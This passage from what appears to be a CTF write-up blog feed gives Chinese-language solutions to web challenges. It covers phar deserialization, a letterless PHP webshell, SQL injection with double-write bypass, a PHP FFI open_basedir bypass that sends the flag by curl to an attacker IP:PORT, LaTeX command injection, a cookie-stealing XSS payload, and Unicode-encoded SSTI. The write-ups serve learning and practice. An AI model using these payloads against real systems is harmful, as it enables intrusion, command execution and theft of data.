        <content type="html"><![CDATA[<h1 id="SWPUCTF-2021-新生赛"><a href="#SWPUCTF-2021-新生赛" class="headerlink" title="SWPUCTF 2021 新生赛"></a>SWPUCTF 2021 新生赛</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-babyunser"><a href="#1-babyunser" class="headerlink" title="1. babyunser"></a>1. babyunser</h3><p>#phar反序列化 </p><ul><li>题目描述</li></ul><p>无</p><ul><li>题目解析</li></ul><p>查看页面源代码，给出了部分代码，读取 class.php 获得代码</p><p>生成 phar 文件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">aa</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">zz</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ff</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"assert"</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">content</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">xx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">zz</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">xx</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$arg</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">aa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上传之后获取到文件地址</p><p>构造 payload 触发 phar 反序列化</p><pre class="line-numbers language-none"><code class="language-none">[POST]file=phar://upload/20830242a3b2fb683924f29813daaec6.txt&amp;method=write&amp;var=content&amp;cmd=system('cat /flag');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230212072253.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SWPUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TQLCTF 2022</title>
      <link href="/2023/01/21/catchtheflag/games/tqlctf/tqlctf-2022/"/>
      <url>/2023/01/21/catchtheflag/games/tqlctf/tqlctf-2022/</url>
      
        <content type="html"><![CDATA[<h1 id="TQLCTF-2022"><a href="#TQLCTF-2022" class="headerlink" title="TQLCTF 2022"></a>TQLCTF 2022</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-simple-bypass"><a href="#1-simple-bypass" class="headerlink" title="1. simple_bypass"></a>1. simple_bypass</h3><p>#文件读取 #二次注入 #无字母数字shell</p><ul><li>题目描述</li></ul><p>无</p><ul><li>题目解析</li></ul><p>存在一个 admin 用户但是不知道密码，注册个测试用户</p><p>好康的里面加载了一个图片，抓包查看一下</p><p><img src="/../../../../pic/Pasted%20image%2020230214082802.png"></p><p>读取下代码</p><p><img src="/../../../../pic/Pasted%20image%2020230214083219.png"></p><p>读取模板文件然后对其中的部分内容进行替换，随后写入到 php 文件中，尝试在这些参数中向 php 文件插入 shell</p><p>user 的长度被限制不超过 6 个字符，pass 经过 hash 处理，website 又在 path 中，punctuation 被限制不能有字母以及数字，可以在此处写入无字母数字 shell</p><p>构造 payload</p><pre class="line-numbers language-none"><code class="language-none">user=1)/*&amp;pass=123&amp;website=123&amp;punctuation=*/;$_='($((%-'^'[][\@@';$__='#:%('^'|}`|';$___=$$__;$_($___['!']);/*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后访问构造</p><pre class="line-numbers language-none"><code class="language-none">?!=cat /flag-706c903e-4c42-4a63-a34e-b72a79d17494<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看页面源代码在最下面获得 flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TQLCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF 2022 新生赛</title>
      <link href="/2023/01/21/catchtheflag/games/swpuctf/swpuctf-2022-xin-sheng-sai/"/>
      <url>/2023/01/21/catchtheflag/games/swpuctf/swpuctf-2022-xin-sheng-sai/</url>
      
        <content type="html"><![CDATA[<h1 id="SWPUCTF-2022-新生赛"><a href="#SWPUCTF-2022-新生赛" class="headerlink" title="SWPUCTF 2022 新生赛"></a>SWPUCTF 2022 新生赛</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-ez-sql"><a href="#1-ez-sql" class="headerlink" title="1. ez_sql"></a>1. ez_sql</h3><p>#SQL注入 #双写绕过</p><ul><li>题目描述</li></ul><p>Flag一步到位！</p><ul><li>题目解析</li></ul><p>使用 GET 方式传参时提示使用相对安全的方式传参</p><p>那就用 POST 方式传参</p><p><img src="/../../../../pic/Pasted%20image%2020230217063614.png"></p><p>给了两个假的 flag</p><p>进行 SQL 注入测试</p><p>经过 FUZZ 测试可知将一些关键字替换为空，双写绕过即可</p><pre class="line-numbers language-none"><code class="language-none">nss=0'/**/ununionion/**/select/**/1,2,3#nss=0'/**/ununionion/**/select/**/1,group_concat(table_name),3/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()#nss=0'/**/ununionion/**/select/**/1,group_concat(column_name),3/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='NSS_tb'#nss=0'/**/ununionion/**/select/**/1,group_concat(Secr3t),3/**/from/**/NSS_tb#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SWPUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCTF 2019</title>
      <link href="/2023/01/21/catchtheflag/games/rctf/rctf-2019/"/>
      <url>/2023/01/21/catchtheflag/games/rctf/rctf-2019/</url>
      
        <content type="html"><![CDATA[<h1 id="RCTF-2019"><a href="#RCTF-2019" class="headerlink" title="RCTF 2019"></a>RCTF 2019</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-nextphp"><a href="#1-nextphp" class="headerlink" title="1. nextphp"></a>1. nextphp</h3><p>#PHP反序列化 #FFI</p><ul><li>题目描述</li></ul><p>无</p><ul><li>题目解析</li></ul><p>直接给出了源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出个 phpinfo 看看</p><p><img src="/../../../../pic/Pasted%20image%2020230306154222.png"></p><p><img src="/../../../../pic/Pasted%20image%2020230306154234.png"></p><p>限制了部分函数与操作路径，且无法绕过</p><p>先读取下当前目录下有啥</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">[GET]?a=var_dump(scandir('.'));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230306155009.png"></p><p>还有个 preload.php 文件，preload 为 FFI 的默认参数</p><p>读取下文件</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">[GET]?a=highlight_file('preload.php');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>perload.php</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span>  <span class="token punctuation">{</span>      <span class="token keyword">protected</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span>          <span class="token string single-quoted-string">'ret'</span> <span class="token operator">=&gt;</span> <span class="token constant">null</span><span class="token punctuation">,</span>          <span class="token string single-quoted-string">'func'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'print_r'</span><span class="token punctuation">,</span>          <span class="token string single-quoted-string">'arg'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'1'</span>      <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>          <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ret'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'arg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">array</span>      <span class="token punctuation">{</span>          <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">data</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__unserialize</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$data</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>          <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">data</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>      <span class="token punctuation">{</span>          <span class="token keyword">return</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>          <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>          <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">data</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>          <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'No implemented'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>          <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'No implemented'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用 FFI 调用 C 函数执行命令绕过 open_basedir  的限制</p><p>在 run 中可以调用任意函数，在此处构造 FFI 利用</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span>  <span class="token punctuation">{</span>      <span class="token keyword">protected</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span>          <span class="token string single-quoted-string">'ret'</span> <span class="token operator">=&gt;</span> <span class="token constant">null</span><span class="token punctuation">,</span>          <span class="token string single-quoted-string">'func'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'FFI::cdef'</span><span class="token punctuation">,</span>          <span class="token string single-quoted-string">'arg'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'int system(char *command);'</span>      <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>          <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ret'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'arg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token comment">//    public function __serialize(): array  </span><span class="token comment">//    {  </span><span class="token comment">//        return $this-&gt;data;  </span><span class="token comment">//    }  </span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__unserialize</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$data</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>          <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">data</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>      <span class="token punctuation">{</span>          <span class="token keyword">return</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>          <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>          <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">data</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>  <span class="token comment">//  </span><span class="token comment">//    public function __set($key, $value)  </span><span class="token comment">//    {  </span><span class="token comment">//        throw new \Exception('No implemented');  </span><span class="token comment">//    }  </span><span class="token comment">//  </span><span class="token comment">//    public function __construct()  </span><span class="token comment">//    {  </span><span class="token comment">//        throw new \Exception('No implemented');  </span><span class="token comment">//    }  </span><span class="token punctuation">}</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿着生成的结果构造 payload</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">[GET]?a=$a=unserialize('C:1:"A":89:{a:3:{s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:26:"int system(char *command);";}}')-&gt;__serialize()['ret']-&gt;system('curl -d @/flag IP:PORT');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>USTC 2022</title>
      <link href="/2023/01/21/catchtheflag/games/ustc/ustc-2022/"/>
      <url>/2023/01/21/catchtheflag/games/ustc/ustc-2022/</url>
      
        <content type="html"><![CDATA[<h1 id="USTC-2022"><a href="#USTC-2022" class="headerlink" title="USTC 2022"></a>USTC 2022</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-LaTex-机器人"><a href="#1-LaTex-机器人" class="headerlink" title="1. LaTex 机器人"></a>1. LaTex 机器人</h3><p>#latex注入</p><p>参考链接</p><p><a href="https://0day.work/hacking-with-latex/">https://0day.work/hacking-with-latex/</a><br><a href="http://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/">http://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/</a><br><a href="https://infosecwriteups.com/latex-to-rce-private-bug-bounty-program-6a0b5b33d26a">https://infosecwriteups.com/latex-to-rce-private-bug-bounty-program-6a0b5b33d26a</a></p><p>payload</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">\</span>input<span class="token punctuation">{</span>/flag1<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结合题目提示 flag 的内容加上花括号</p><p>flag{becAr3fu11dUd3daa5d6b003}</p><p>\immediate\write18{cat /flag2 | base64 &gt; test.tex}</p><p>\input{text.tex}</p><p>第二题</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">\</span>newread<span class="token punctuation">\</span>file <span class="token punctuation">\</span>openin<span class="token punctuation">\</span>file<span class="token operator">=</span>/flag2 <span class="token punctuation">\</span>catcode<span class="token variable"><span class="token variable">`</span><span class="token punctuation">\</span>#<span class="token operator">=</span><span class="token number">11</span> <span class="token punctuation">\</span>catcode<span class="token variable">`</span></span><span class="token punctuation">\</span>_<span class="token operator">=</span><span class="token number">11</span> <span class="token punctuation">\</span>catcode<span class="token variable"><span class="token variable">`</span><span class="token punctuation">\</span><span class="token punctuation">{</span><span class="token operator">=</span><span class="token number">11</span> <span class="token punctuation">\</span>catcode<span class="token variable">`</span></span><span class="token punctuation">\</span><span class="token punctuation">}</span><span class="token operator">=</span><span class="token number">11</span> <span class="token punctuation">\</span>read<span class="token punctuation">\</span>file to<span class="token punctuation">\</span>line <span class="token punctuation">\</span>line <span class="token punctuation">\</span>closein<span class="token punctuation">\</span>file<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221029153427.png"></p><p>其中 - 为 { ，“ 为 }</p><p>flag{latex_bec_0_m##es_co__#ol_01e0dc5f32}</p><h3 id="2-Flag-的痕迹"><a href="#2-Flag-的痕迹" class="headerlink" title="2. Flag 的痕迹"></a>2. Flag 的痕迹</h3><p>本地搭建一个环境</p><p><a href="https://github.com/splitbrain/dokuwiki/releases/tag/release_stable_2022-07-31a">https://github.com/splitbrain/dokuwiki/releases/tag/release_stable_2022-07-31a</a></p><p>在进行历史修改对比时注意到 URL 的内容</p><p><img src="/../../../../pic/Pasted%20image%2020221022140312.png"></p><p>复制下来放到题目上成功进入到历史修改比对功能中</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">doku.php?id=start&amp;rev=1666418358&amp;do=diff<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221022140405.png"></p><p>flag{d1gandFInD_d0kuw1k1_unexpectEd_API}</p><h3 id="3-微积分计算小练习"><a href="#3-微积分计算小练习" class="headerlink" title="3. 微积分计算小练习"></a>3. 微积分计算小练习</h3><p>下载下来源代码，发现将 flag 写入到 cookie 中，一眼 xss 注入</p><p><img src="/../../../../pic/Pasted%20image%2020221022142326.png"></p><p>构造payload</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">http://202.38.93.111:10056/share?result=MTAwOmFWYXNDcmlwdDovKi0vKmAvKlxgLyonLyoiLyoqLygvKiAqL29OY2xpQ2s9YWxlcnQoZG9jdW1lbnQuY29va2llKSApLy8lMEQlMEElMEQlMEEvLzwvc3RZbGUvPC90aXRMZS88L3RlWHRhckVhLzwvc2NSaXB0Ly0tIT5ceDNjc1ZnLzxzVmcvb05sb0FkPWFsZXJ0KGRvY3VtZW50LmNvb2tpZSkvLz5ceDNl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221022142420.png"></p><p>flag{xS5_1OI_is_N0t_SOHARD_162f01dd1a}</p>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> USTC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安洵杯 2020</title>
      <link href="/2023/01/21/catchtheflag/games/an-xun-bei/an-xun-bei-2020/"/>
      <url>/2023/01/21/catchtheflag/games/an-xun-bei/an-xun-bei-2020/</url>
      
        <content type="html"><![CDATA[<h1 id="安洵杯-2020"><a href="#安洵杯-2020" class="headerlink" title="安洵杯 2020"></a>安洵杯 2020</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-Normal-SSTI"><a href="#1-Normal-SSTI" class="headerlink" title="1. Normal SSTI"></a>1. Normal SSTI</h3><p>#SSTI #UNICODE绕过 </p><ul><li>题目描述</li></ul><p>无</p><ul><li>题目解析</li></ul><p>访问 <code>/test?url={{7*&amp;}}</code> 发现 <code>{{}}</code> 被过滤掉了，那就用 <code>{%print()%}</code> 代替</p><p>因为 <code>.</code> 和 <code>[]</code> 被过滤，所以使用 flask 的 <code>|attr</code> 来调用方法</p><p>使用 flask 里的 lipsum 方法，来执行命令</p><p>最终目标为构造</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">lipsum|attr("__globals__").get("os").popen("ls").read()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 Unicode 编码绕过</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">[GET]/test?url={%print(lipsum|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f"))%}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230214124748.png"></p><p>接下来就很简单了，直接构造 payload</p><pre class="line-numbers language-text" data-language="text"><code 